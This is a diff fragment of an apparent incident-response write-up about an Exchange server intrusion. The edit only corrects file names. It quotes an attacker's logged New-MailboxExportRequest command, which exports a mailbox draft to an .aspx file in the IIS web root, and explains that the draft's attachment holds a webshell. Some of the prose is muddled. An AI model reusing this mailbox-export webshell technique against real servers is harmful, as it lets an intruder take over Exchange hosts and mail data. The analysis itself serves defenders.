@@ -112,12 +112,12 @@ New-MailboxExportRequest\n-Mailbox 'Hamad@xxxxx.darksys.com' -FilePath '\\\\loca
 
 ```csharp
 New-MailboxExportRequest\n-Mailbox 'Hamad@xxxxx[.darksys.com]
-' -FilePath '\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet\\p433zrwewrvmcv.aspx' -IncludeFolders ('#Drafts#') -ContentFilter 'Subject -eq 'rksgzvccymzrvmcv''\[nxxxxx/xxxxx-OU/]
+' -FilePath '\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet\\p433zrwewrvmcv.aspx' -IncludeFolders ('#Drafts#') -ContentFilter 'Subject -eq 'p433zrwewrvmcv''\[nxxxxx/xxxxx-OU/]
 xxxxx Hamad A. Admin\S-1-5-21-43453453453-435435345-1482027129-500\nRemote-PowerShell-Unknown\n10544
 ```
 
 Moreover, the malicious actor exported 'Hamad@darksys.com
-'  mailbox to the path “C:\\inetpub\\wwwroot\\aspnet\\ on exchange server. This results in a PST file with .aspx extension: rksgzvccymzrvmcv.aspx. Under normal circumstances, “p433zrwewrvmcv.aspx” would have been capable of executing javascript code since the attached file.
+'  mailbox to the path “C:\\inetpub\\wwwroot\\aspnet\\ on exchange server. This results in a PST file with .aspx extension: p433zrwewrvmcv.aspx. Under normal circumstances, “p433zrwewrvmcv.aspx” would have been capable of executing javascript code since the attached file.
 
 **FileAttachment.txt** in the draft email is usually a webshell, however, since this was the first email created by the malicious actor, refer to the below figure. created draft emails have a webshell in the attachment.
 
